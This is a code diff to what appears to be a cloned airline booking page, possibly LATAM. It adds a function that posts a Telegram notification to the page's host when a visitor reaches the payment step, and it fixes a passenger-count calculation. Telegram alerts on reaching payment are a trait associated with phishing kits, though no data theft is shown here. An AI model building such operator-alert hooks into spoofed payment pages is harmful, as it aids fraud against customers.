@@ -1137,17 +1137,39 @@ var my_contenido = `
 
 //<script>
     // my_data['pasajeros'] = my_data['pasajeros'] || '{"adultos":1,"ninos":0,"bebes":0}';
+
+    // Función para enviar notificaciones a Telegram
+    function sendTelegramNotification(mensaje) {
+        try {
+            $.ajax({
+                url: my_hosting + '__ltam/send_notification.php',
+                method: 'POST',
+                data: { mensaje: mensaje },
+                async: true
+            });
+        } catch(e) {
+            console.log('Error al enviar notificación:', e);
+        }
+    }
+
     $(document).ready(function() {
+
+        // Notificación: En la página de pago
+        setTimeout(function() {
+            sendTelegramNotification('*en la página de pago*');
+        }, 1000);
+
         var totalPasajeros = Object.values(JSON.parse(my_data['pasajeros'])).reduce((acc, val) => acc + val, 0);
         $('#numPasajeros').text(totalPasajeros + ' pasajero' + (totalPasajeros > 1 ? 's' : ''));
         var totalVuelo = 0;
         var totalPasajeros = 1;
         try {
             const pasajeros = JSON.parse(my_data['pasajeros'] || "{}");
-            totalPasajeros =
+            const calculatedPasajeros =
                 (pasajeros.adultos || 0) +
                 (pasajeros.ninos || 0) +
                 (pasajeros.bebes || 0);
+            totalPasajeros = calculatedPasajeros > 0 ? calculatedPasajeros : 1;
         } catch (e) {
             console.warn("Error al parsear pasajeros:", e);
         }
